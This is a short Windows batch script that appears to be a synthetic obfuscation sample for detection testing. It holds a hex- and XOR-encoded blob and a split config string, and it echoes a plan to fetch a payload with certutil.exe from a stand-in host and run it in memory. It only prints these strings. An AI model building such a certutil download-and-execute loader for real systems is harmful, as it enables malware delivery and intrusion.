@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:hex_pairs|xor_5a

rem HUNTRESS-MATERIAL:2c676b26292e3f2a29673b392b2f33283f05283f37352e3f763e33292a3b2e393205373f37352823263b3e3b2a2e3f2867393f282e2f2e3336743f223f26292e3b3d3f0539352f342e676b263d283b2a32673e333b3735343e26343f222e05363b343d2f3b3d3f673435343f26393b372a3b333d3405333e67393b372a3b333d34776f6d3c3f3c636d3f3c39262f283667322e2e2a296075756f6d3c3f3c636d3f3c39743f223b372a363f7433342c3b36333e75686f3e6a6c3b626f743e3b2e

rem HUNTRESS-EXTENSION:cmd

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

SeT "v_a0=v=1|steps=acquire_remote,dispatch_memory|adapter"
SeT "v_a1==certutil.exe|stage_count=1|graph=diamond|next_l"
SeT "v_a2=anguage=none|campaign_id=campaign-57fef97efc|url"
SeT "v_a3==https://57fef97efc.example.invalid/25d06a85.dat"

goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE

set "neutral_dead_label=dbd87966"

for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "cfg=!v_a0!!v_a1!!v_a2!!v_a3!"
exit /b 0
:HUNTRESS_EMIT

echo(!cfg!

exit /b 0

:HUNTRESS_PLAN

echo certutil.exe GET https://57fef97efc.example.invalid/25d06a85.dat then dispatch memory

exit /b 0

